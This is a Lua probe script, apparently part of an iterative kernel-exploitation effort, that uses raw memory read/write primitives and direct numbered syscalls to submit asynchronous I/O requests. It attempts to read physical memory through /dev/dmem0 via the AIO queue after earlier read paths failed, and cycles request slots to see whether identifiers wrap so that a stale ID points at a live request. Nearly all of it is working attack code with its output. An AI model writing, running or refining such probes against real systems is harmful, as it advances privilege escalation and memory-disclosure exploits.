-- CRASH_CLASS: MODERATE
-- PROBE 352o: what else the AIO read can be pointed at
--
-- Two questions left in the family.
--
-- 1. The read path goes through the file descriptor's own read routine. Every
--    earlier dmem attempt failed through open/read/ioctl, but the queue is a
--    different caller - it may exercise the same routine with a different
--    protection context. /dev/dmem0 is the one node whose open succeeded and
--    whose data was never obtained.
--
-- 2. The identifier's high word changes on every reuse of a slot (0x42 -> 0x62
--    -> 0x82 ...). If that field is only a few bits wide it wraps, and an
--    identifier from twenty requests ago would name a live request again. This
--    probe cycles one slot and records whether a value repeats.

print("=== PROBE 352o: AIO READ TARGETS AND ID WRAP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function hi_lo(v)
    local h, l = get_hi_lo(v)
    return to_num(h), to_num(l)
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wq(addr, value)
    pcall(function() memory.write_qword(addr, value) end)
end
local function wd(addr, value)
    pcall(function() memory.write_dword(addr, value) end)
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function open_path(path, flags)
    local ok, rv = pcall(function() return sc(5)(put_str(path), uint64(flags), Z) end)
    if not ok then return -1 end
    return sgn(rv)
end

local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local result = memory.alloc(0x200)
local ids = memory.alloc(0x200)
local states = memory.alloc(0x100)
for i = 0, 0x3F do
    wq(reqs + i * 8, 0)
    wd(result + i * 4, 0)
    wd(ids + i * 4, 0)
    wd(states + i * 4, 0)
end
for i = 0, 0x3FF do wd(data + i * 4, 0) end

local function submit(cmd, len, buf, fd)
    wq(reqs + 0x00, 0)
    wq(reqs + 0x08, len)
    local bh, bl = hi_lo(buf)
    wd(reqs + 0x10, bl) wd(reqs + 0x14, bh)
    local rh, rl = hi_lo(uint64(result))
    wd(reqs + 0x18, rl) wd(reqs + 0x1C, rh)
    wd(reqs + 0x20, fd)
    wd(reqs + 0x24, 0)
    wd(result, 0)
    wd(ids, 0)
    local ok1, r1 = pcall(function()
        return sc(669)(uint64(cmd), uint64(reqs), uint64(1), uint64(1), uint64(ids))
    end)
    local id = rd(ids)
    if id and id ~= 0 then
        wd(states, 0)
        pcall(function() return sc(664)(uint64(ids), uint64(1), uint64(states)) end)
    end
    return ok1 and sgn(r1) or nil, id, rd(result)
end

local function reap(id)
    if id and id ~= 0 then
        wd(ids, id)
        wd(states, 0)
        pcall(function() return sc(662)(uint64(ids), uint64(1), uint64(states)) end)
    end
end

for i = 0, 0x3F do wd(data + i * 4, 0) end

print("[A] reading through /dev/dmem0")
local fdm = open_path("/dev/dmem0", 0)
print(string.format("  open(/dev/dmem0, O_RDONLY) = %d", fdm))
if fdm >= 0 then
    local s, id, r = submit(1, 16, uint64(data), fdm)
    reap(id)
    print(string.format("  cmd=1 len=16 submit=%s id=0x%X result=0x%08X", tostring(s), id, r))
    print(string.format("      data=%08X %08X %08X %08X", rd(data), rd(data + 4), rd(data + 8), rd(data + 12)))
    s, id, r = submit(1, 0x1000, uint64(data), fdm)
    reap(id)
    print(string.format("  cmd=1 len=0x1000 submit=%s result=0x%08X data[0]=%08X", tostring(s), r, rd(data)))
    pcall(function() return sc(6)(uint64(fdm)) end)
end

print("[B] the control that proves the queue is healthy")
local fdz = open_path("/dev/zero", 0)
print(string.format("  open(/dev/zero) = %d", fdz))
if fdz >= 0 then
    local s, id, r = submit(1, 16, uint64(data), fdz)
    reap(id)
    print(string.format("  cmd=1 /dev/zero submit=%s result=0x%08X data=%08X", tostring(s), r, rd(data)))
    pcall(function() return sc(6)(uint64(fdz)) end)
end

print("[C] one slot, twenty submit/delete cycles, watching the high word")
local fdz2 = open_path("/dev/zero", 0)
print(string.format("  open(/dev/zero) = %d", fdz2))
local seen = {}
local repeats = 0
for i = 1, 20 do
    wd(data, 0)
    local s, id, r = submit(1, 16, uint64(data), fdz2)
    if id and id ~= 0 then
        local key = string.format("0x%08X", id)
        if seen[key] then
            repeats = repeats + 1
            print(string.format("  %2d id=0x%08X  ALREADY SEEN", i, id))
        else
            seen[key] = true
            print(string.format("  %2d id=0x%08X", i, id))
        end
        reap(id)
    end
end
print(string.format("  repeated identifiers: %d", repeats))
if fdz2 >= 0 then pcall(function() return sc(6)(uint64(fdz2)) end) end

print("")
print("=== 352o DONE ===")
